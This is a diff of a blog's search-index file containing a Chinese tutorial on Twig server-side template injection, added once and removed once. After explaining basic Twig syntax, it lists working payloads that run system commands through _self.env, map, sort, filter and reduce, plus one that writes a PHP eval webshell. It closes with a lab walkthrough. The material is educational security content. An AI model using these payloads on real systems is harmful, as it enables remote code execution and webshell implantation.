+    <url>/2022/02/16/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B9%8BTWIG/</url>
+    <content><![CDATA[<h1 id="模板注入之TWIG"><a href="#模板注入之TWIG" class="headerlink" title="模板注入之TWIG"></a>模板注入之TWIG</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>Twig可能是PHP最流行的模板库，它是由Synfony（一个非常流行的PHP框架）的创建者开发的。在我们的练习中，我们还将用到Craft CMS，它是一个内部使用Twig的内容管理系统。</p>
+<h2 id="环境安装"><a href="#环境安装" class="headerlink" title="环境安装"></a>环境安装</h2><p>注:安装环境PHP版本至少7.0</p>
+<p>直接使用composer命令安装指定版本</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">composer require &quot;twig/twig:^2.0&quot;</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="基础语法"><a href="#基础语法" class="headerlink" title="基础语法"></a>基础语法</h2><ul>
+<li><strong></strong>:说些什么.值的是输出一个变量值或者一个表达式的结果到模板。如：。</li>
+</ul>
+<p>变量绑定:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Hello  &#123;&#123; var &#125;&#125;</span><br><span class="line"></span><br><span class="line">Hello &#123;&#123; var|escape &#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">twig也包含filters，它可以在模板渲染之前改变输出内容。如:&#123;&#123;表达式 | filters&#125;&#125;。</span><br><span class="line">注:这里还需要注意的是，当表达式中传值的时候，使用『:』,例如：&#123;&#123; path(‘board_reply’,&#123;id:item.id&#125;) &#125;&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<ul>
+<li><p><strong><a href title target></a></strong>:做些什么.控制模板逻辑的tag(标签),用于执行声明，如if、for循环语句等。</p>
+</li>
+<li><p><strong></strong>:进行注释.它相当于php的语法。它用于注释单行和多行。注释的内容不作为页面输出。</p>
+</li>
+</ul>
+<h3 id="block"><a href="#block" class="headerlink" title="block"></a>block</h3><p>相当于占位符，当被另一个模板继承时，可以调用这个模块。定义时的内容在继承的模板中默认是不会出现的，可以使用 {undefined{ parent() }} 来显示。块名称可以使用字母数字字符和下划线，不允许使用破折号(-)</p>
+<h3 id="extends"><a href="#extends" class="headerlink" title="extends"></a>extends</h3><p>不支持多重继承，只支持一个扩展模板</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;% extends &#x27;base.html.twig&#x27; %&#125;</span><br><span class="line">&#123;% include %&#125;：包含模板</span><br><span class="line">&#123;% extends %&#125;：扩展模板</span><br><span class="line">&#123;% embed %&#125; xxx &#123;% endembed %&#125;：包含模板并扩展该模板的内容，相当于 include 和 extends 的结合体</span><br><span class="line">&#123;% macro %&#125; xxx &#123;% endmacro %&#125;：定义宏以便多次调用，与定义 PHP 函数无异</span><br><span class="line">&#123;% from aaa import bbb as ccc %&#125;：从指定模板导入宏并设置别名</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h3><ul>
+<li>如果在模板中使用extends,它必须是模板中的第一个标签</li>
+<li>如果在多个模板中有重复的内容,这可能意味着你需要为该内容在父模板中定义一个block</li>
+<li>某些情况下，更好的解决方案可能是把这些内容放到一个新模板中，然后在该模板中include它。</li>
+<li>如果你需要从父模板中获取一个block的内容，可以使用函数。如果你只是想在父级块上添加新内容，而不是完全覆盖它</li>
+<li>记住添加end符号</li>
+</ul>
+<h3 id="判断"><a href="#判断" class="headerlink" title="判断"></a>判断</h3><p><strong>判断变量是否定义(存在)</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;% if a is defined %&#125;</span><br><span class="line">&#123;%  a.name  %&#125;</span><br><span class="line">&#123;%  endif %&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>判断变量是否为空</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;% if a is null %&#125;</span><br><span class="line">&#123;# do something #&#125;</span><br><span class="line">&#123;% endif %&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>多条件判断语法</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;% if a %&#125;</span><br><span class="line">    &#123;&#123; a.name &#125;&#125;</span><br><span class="line">&#123;% else %&#125;</span><br><span class="line">        &lt;h1&gt;xxxxxxx&lt;/h1&gt;</span><br><span class="line">   &#123;% endid %&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="循环"><a href="#循环" class="headerlink" title="循环"></a>循环</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;% for a in list %&#125;</span><br><span class="line">           &lt;li&gt;&#123;&#123;a.name&#125;&#125;&lt;/li&gt;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>按数组的key，value遍历，key&#x3D;index，value&#x3D;item</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;% for index, item in list %&#125;</span><br><span class="line">    &#123;&#123; index &#125;&#125;:&#123;&#123; item.id &#125;&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>按数组的key值遍历</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;% for key in list|keys %&#125;</span><br><span class="line">&#123;&#123; key &#125;&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="注入攻击"><a href="#注入攻击" class="headerlink" title="注入攻击"></a>注入攻击</h2><p>twig存在1.x，2.x，3.x的多个版本，不同版本的payload也有所不同。对于Twig来说，其变量_self暴露了Twig内部的许多API。</p>
+<h3 id="Twig-1-x"><a href="#Twig-1-x" class="headerlink" title="Twig 1.x"></a>Twig 1.x</h3><p><strong>getFilter函数中存在危险函数call_user_func</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public function getFilter(name)</span><br><span class="line">  &#123;</span><br><span class="line">    ...</span><br><span class="line">    foreach (this-&gt;filterCallbacks as callback) &#123;</span><br><span class="line">    if (false !==filter = call_user_func(callback,name)) &#123;</span><br><span class="line">      return filter;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  return false;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public function registerUndefinedFilterCallback(callable)</span><br><span class="line">&#123;</span><br><span class="line">  this-&gt;filterCallbacks[] =callable;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>通过传递参数到该函数中，我们可以调用任意 PHP 函数。Payload 如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)&#125;&#125;&#123;&#123;_self.env.getFilter(&quot;id&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="Twig-2-x-amp-amp-3-x"><a href="#Twig-2-x-amp-amp-3-x" class="headerlink" title="Twig 2.x&amp;&amp;3.x"></a>Twig 2.x&amp;&amp;3.x</h3><p>测试代码</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">require_once __DIR__.&#x27;/vendor/autoload.php&#x27;;</span><br><span class="line"></span><br><span class="line">loader = new \Twig\Loader\ArrayLoader();twig = new \Twig\Environment(loader);template = twig-&gt;createTemplate(&quot;Hello &#123;_GET[&#x27;name&#x27;]&#125;!&quot;);</span><br><span class="line"></span><br><span class="line">echo $template-&gt;render();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>命令执行成功，计算器打开</p>
+<img src="/2022/02/16/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B9%8BTWIG/image-20220217143043214.png" class title="image-20220217143043214">
+
+
+
+<p><strong>使用map过滤器</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;[&quot;calc&quot;]|map(&quot;system&quot;)&#125;&#125;</span><br><span class="line">&#123;&#123;[&quot;calc&quot;]|map(&quot;passthru&quot;)&#125;&#125;</span><br><span class="line">&#123;&#123;[&quot;calc&quot;]|map(&quot;exec&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>如果以上几个函数被禁用，我们还可以调用file_put_contents函数写一句话木马，生成webshell。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;&#123;&quot;&lt;?php phpinfo();eval($_POST[whoami])&quot;:&quot;/var/www/html/shell.php&quot;&#125;|map(&quot;file_put_contents&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>使用sort过滤器</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;[&quot;calc&quot;, 0]|sort(&quot;system&quot;)&#125;&#125;</span><br><span class="line">&#123;&#123;[&quot;calc&quot;, 0]|sort(&quot;passthru&quot;)&#125;&#125;</span><br><span class="line">&#123;&#123;[&quot;calc&quot;, 0]|sort(&quot;exec&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>使用filter过滤器</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;[&quot;calc&quot;]|filter(&quot;system&quot;)&#125;&#125;</span><br><span class="line">&#123;&#123;[&quot;calc&quot;]|filter(&quot;passthru&quot;)&#125;&#125;</span><br><span class="line">&#123;&#123;[&quot;calc&quot;]|filter(&quot;exec&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>使用reduce过滤器</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;[0, 0]|reduce(&quot;system&quot;, &quot;calc&quot;)&#125;&#125;</span><br><span class="line">&#123;&#123;[0, 0]|reduce(&quot;passthru&quot;, &quot;calc&quot;)&#125;&#125;</span><br><span class="line">&#123;&#123;[0, 0]|reduce(&quot;exec&quot;, &quot;calc&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="靶场练习"><a href="#靶场练习" class="headerlink" title="靶场练习"></a>靶场练习</h2><p>靶场地址:<a href="https://gosecure.github.io/template-injection-workshop/#0">http://template-injection.gosec.co:8012/.</a></p>
+<img src="/2022/02/16/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B9%8BTWIG/image-20220217145127665.png" class title="image-20220217145127665">
+
+
+
+<p>在这个表单中，您可以提交一个简单的表达式来确认模板是否用于显示值。下面的表达式将进行减法运算。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;1338-1&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>上面减法运算的结果，应该显示为1337</p>
+<p>下面输入payload执行id命令</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)&#125;&#125;&#123;&#123;_self.env.getFilter(&quot;id&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>执行结果应该是:</p>
+<img src="/2022/02/16/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B9%8BTWIG/image-20220217145353259.png" class title="image-20220217145353259">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="http://www.m1saka.love/index.php/2021/08/20/mobanzhuru/">twig模板注入payload ~ M1saka’s blog</a></p>
+<p><a href="https://mp.weixin.qq.com/s?__biz=MzAxODcyNjEzNQ==&mid=2247518980&idx=4&sn=2fa791299de826677ad77e28c9e053ee&chksm=9bd3269caca4af8a9659666c8fc5a272f6f0de5927dbe305e25dacc104cc02b2154dfebf4ac9&scene=21#wechat_redirect">详解模板注入漏洞（上） (qq.com)</a></p>
+]]></content>
+      <categories>
+        <category>Web漏洞</category>
+        <category>模板注入</category>
+        <category>注入漏洞</category>
+      </categories>
+      <tags>
+        <tag>-Web漏洞 -模板注入 -TWIG</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>模板注入漏洞汇总</title>
     <url>/2022/02/11/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB/</url>
     <content><![CDATA[<h1 id="模板注入漏洞汇总"><a href="#模板注入漏洞汇总" class="headerlink" title="模板注入漏洞汇总"></a>模板注入漏洞汇总</h1><hr>
@@ -3780,165 +3989,6 @@
       </categories>
       <tags>
         <tag>-Web漏洞 -模板注入集合</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>模板注入之TWIG</title>
-    <url>/2022/02/16/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B9%8BTWIG/</url>
-    <content><![CDATA[<h1 id="模板注入之TWIG"><a href="#模板注入之TWIG" class="headerlink" title="模板注入之TWIG"></a>模板注入之TWIG</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>Twig可能是PHP最流行的模板库，它是由Synfony（一个非常流行的PHP框架）的创建者开发的。在我们的练习中，我们还将用到Craft CMS，它是一个内部使用Twig的内容管理系统。</p>
-<h2 id="环境安装"><a href="#环境安装" class="headerlink" title="环境安装"></a>环境安装</h2><p>注:安装环境PHP版本至少7.0</p>
-<p>直接使用composer命令安装指定版本</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">composer require &quot;twig/twig:^2.0&quot;</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="基础语法"><a href="#基础语法" class="headerlink" title="基础语法"></a>基础语法</h2><ul>
-<li><strong></strong>:说些什么.值的是输出一个变量值或者一个表达式的结果到模板。如：。</li>
-</ul>
-<p>变量绑定:</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Hello  &#123;&#123; var &#125;&#125;</span><br><span class="line"></span><br><span class="line">Hello &#123;&#123; var|escape &#125;&#125;</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">twig也包含filters，它可以在模板渲染之前改变输出内容。如:&#123;&#123;表达式 | filters&#125;&#125;。</span><br><span class="line">注:这里还需要注意的是，当表达式中传值的时候，使用『:』,例如：&#123;&#123; path(‘board_reply’,&#123;id:item.id&#125;) &#125;&#125;</span><br></pre></td></tr></table></figure>
-
-
-
-<ul>
-<li><p><strong><a href title target></a></strong>:做些什么.控制模板逻辑的tag(标签),用于执行声明，如if、for循环语句等。</p>
-</li>
-<li><p><strong></strong>:进行注释.它相当于php的语法。它用于注释单行和多行。注释的内容不作为页面输出。</p>
-</li>
-</ul>
-<h3 id="block"><a href="#block" class="headerlink" title="block"></a>block</h3><p>相当于占位符，当被另一个模板继承时，可以调用这个模块。定义时的内容在继承的模板中默认是不会出现的，可以使用 {undefined{ parent() }} 来显示。块名称可以使用字母数字字符和下划线，不允许使用破折号(-)</p>
-<h3 id="extends"><a href="#extends" class="headerlink" title="extends"></a>extends</h3><p>不支持多重继承，只支持一个扩展模板</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;% extends &#x27;base.html.twig&#x27; %&#125;</span><br><span class="line">&#123;% include %&#125;：包含模板</span><br><span class="line">&#123;% extends %&#125;：扩展模板</span><br><span class="line">&#123;% embed %&#125; xxx &#123;% endembed %&#125;：包含模板并扩展该模板的内容，相当于 include 和 extends 的结合体</span><br><span class="line">&#123;% macro %&#125; xxx &#123;% endmacro %&#125;：定义宏以便多次调用，与定义 PHP 函数无异</span><br><span class="line">&#123;% from aaa import bbb as ccc %&#125;：从指定模板导入宏并设置别名</span><br></pre></td></tr></table></figure>
-
-
-
-<h3 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h3><ul>
-<li>如果在模板中使用extends,它必须是模板中的第一个标签</li>
-<li>如果在多个模板中有重复的内容,这可能意味着你需要为该内容在父模板中定义一个block</li>
-<li>某些情况下，更好的解决方案可能是把这些内容放到一个新模板中，然后在该模板中include它。</li>
-<li>如果你需要从父模板中获取一个block的内容，可以使用函数。如果你只是想在父级块上添加新内容，而不是完全覆盖它</li>
-<li>记住添加end符号</li>
-</ul>
-<h3 id="判断"><a href="#判断" class="headerlink" title="判断"></a>判断</h3><p><strong>判断变量是否定义(存在)</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;% if a is defined %&#125;</span><br><span class="line">&#123;%  a.name  %&#125;</span><br><span class="line">&#123;%  endif %&#125;</span><br></pre></td></tr></table></figure>
-
-
-
-<p><strong>判断变量是否为空</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;% if a is null %&#125;</span><br><span class="line">&#123;# do something #&#125;</span><br><span class="line">&#123;% endif %&#125;</span><br></pre></td></tr></table></figure>
-
-
-
-<p><strong>多条件判断语法</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;% if a %&#125;</span><br><span class="line">    &#123;&#123; a.name &#125;&#125;</span><br><span class="line">&#123;% else %&#125;</span><br><span class="line">        &lt;h1&gt;xxxxxxx&lt;/h1&gt;</span><br><span class="line">   &#123;% endid %&#125;</span><br></pre></td></tr></table></figure>
-
-
-
-<h3 id="循环"><a href="#循环" class="headerlink" title="循环"></a>循环</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;% for a in list %&#125;</span><br><span class="line">           &lt;li&gt;&#123;&#123;a.name&#125;&#125;&lt;/li&gt;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>
-
-
-
-<p>按数组的key，value遍历，key&#x3D;index，value&#x3D;item</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;% for index, item in list %&#125;</span><br><span class="line">    &#123;&#123; index &#125;&#125;:&#123;&#123; item.id &#125;&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>
-
-
-
-<p>按数组的key值遍历</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;% for key in list|keys %&#125;</span><br><span class="line">&#123;&#123; key &#125;&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="注入攻击"><a href="#注入攻击" class="headerlink" title="注入攻击"></a>注入攻击</h2><p>twig存在1.x，2.x，3.x的多个版本，不同版本的payload也有所不同。对于Twig来说，其变量_self暴露了Twig内部的许多API。</p>
-<h3 id="Twig-1-x"><a href="#Twig-1-x" class="headerlink" title="Twig 1.x"></a>Twig 1.x</h3><p><strong>getFilter函数中存在危险函数call_user_func</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public function getFilter(name)</span><br><span class="line">  &#123;</span><br><span class="line">    ...</span><br><span class="line">    foreach (this-&gt;filterCallbacks as callback) &#123;</span><br><span class="line">    if (false !==filter = call_user_func(callback,name)) &#123;</span><br><span class="line">      return filter;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  return false;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public function registerUndefinedFilterCallback(callable)</span><br><span class="line">&#123;</span><br><span class="line">  this-&gt;filterCallbacks[] =callable;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-
-
-<p>通过传递参数到该函数中，我们可以调用任意 PHP 函数。Payload 如下：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)&#125;&#125;&#123;&#123;_self.env.getFilter(&quot;id&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure>
-
-
-
-<h3 id="Twig-2-x-amp-amp-3-x"><a href="#Twig-2-x-amp-amp-3-x" class="headerlink" title="Twig 2.x&amp;&amp;3.x"></a>Twig 2.x&amp;&amp;3.x</h3><p>测试代码</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">require_once __DIR__.&#x27;/vendor/autoload.php&#x27;;</span><br><span class="line"></span><br><span class="line">loader = new \Twig\Loader\ArrayLoader();twig = new \Twig\Environment(loader);template = twig-&gt;createTemplate(&quot;Hello &#123;_GET[&#x27;name&#x27;]&#125;!&quot;);</span><br><span class="line"></span><br><span class="line">echo $template-&gt;render();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-
-
-<p>命令执行成功，计算器打开</p>
-<img src="/2022/02/16/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B9%8BTWIG/image-20220217143043214.png" class title="image-20220217143043214">
-
-
-
-<p><strong>使用map过滤器</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;[&quot;calc&quot;]|map(&quot;system&quot;)&#125;&#125;</span><br><span class="line">&#123;&#123;[&quot;calc&quot;]|map(&quot;passthru&quot;)&#125;&#125;</span><br><span class="line">&#123;&#123;[&quot;calc&quot;]|map(&quot;exec&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure>
-
-
-
-<p>如果以上几个函数被禁用，我们还可以调用file_put_contents函数写一句话木马，生成webshell。</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;&#123;&quot;&lt;?php phpinfo();eval($_POST[whoami])&quot;:&quot;/var/www/html/shell.php&quot;&#125;|map(&quot;file_put_contents&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure>
-
-<p><strong>使用sort过滤器</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;[&quot;calc&quot;, 0]|sort(&quot;system&quot;)&#125;&#125;</span><br><span class="line">&#123;&#123;[&quot;calc&quot;, 0]|sort(&quot;passthru&quot;)&#125;&#125;</span><br><span class="line">&#123;&#123;[&quot;calc&quot;, 0]|sort(&quot;exec&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure>
-
-<p><strong>使用filter过滤器</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;[&quot;calc&quot;]|filter(&quot;system&quot;)&#125;&#125;</span><br><span class="line">&#123;&#123;[&quot;calc&quot;]|filter(&quot;passthru&quot;)&#125;&#125;</span><br><span class="line">&#123;&#123;[&quot;calc&quot;]|filter(&quot;exec&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure>
-
-<p><strong>使用reduce过滤器</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;[0, 0]|reduce(&quot;system&quot;, &quot;calc&quot;)&#125;&#125;</span><br><span class="line">&#123;&#123;[0, 0]|reduce(&quot;passthru&quot;, &quot;calc&quot;)&#125;&#125;</span><br><span class="line">&#123;&#123;[0, 0]|reduce(&quot;exec&quot;, &quot;calc&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="靶场练习"><a href="#靶场练习" class="headerlink" title="靶场练习"></a>靶场练习</h2><p>靶场地址:<a href="https://gosecure.github.io/template-injection-workshop/#0">http://template-injection.gosec.co:8012/.</a></p>
-<img src="/2022/02/16/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B9%8BTWIG/image-20220217145127665.png" class title="image-20220217145127665">
-
-
-
-<p>在这个表单中，您可以提交一个简单的表达式来确认模板是否用于显示值。下面的表达式将进行减法运算。</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;1338-1&#125;&#125;</span><br></pre></td></tr></table></figure>
-
-<p>上面减法运算的结果，应该显示为1337</p>
-<p>下面输入payload执行id命令</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)&#125;&#125;&#123;&#123;_self.env.getFilter(&quot;id&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure>
-
-
-
-<p>执行结果应该是:</p>
-<img src="/2022/02/16/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B9%8BTWIG/image-20220217145353259.png" class title="image-20220217145353259">
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="http://www.m1saka.love/index.php/2021/08/20/mobanzhuru/">twig模板注入payload ~ M1saka’s blog</a></p>
-<p><a href="https://mp.weixin.qq.com/s?__biz=MzAxODcyNjEzNQ==&mid=2247518980&idx=4&sn=2fa791299de826677ad77e28c9e053ee&chksm=9bd3269caca4af8a9659666c8fc5a272f6f0de5927dbe305e25dacc104cc02b2154dfebf4ac9&scene=21#wechat_redirect">详解模板注入漏洞（上） (qq.com)</a></p>
-]]></content>
-      <categories>
-        <category>Web漏洞</category>
-        <category>模板注入</category>
-        <category>注入漏洞</category>
-      </categories>
-      <tags>
-        <tag>-Web漏洞 -模板注入 -TWIG</tag>
       </tags>
   </entry>
   <entry>
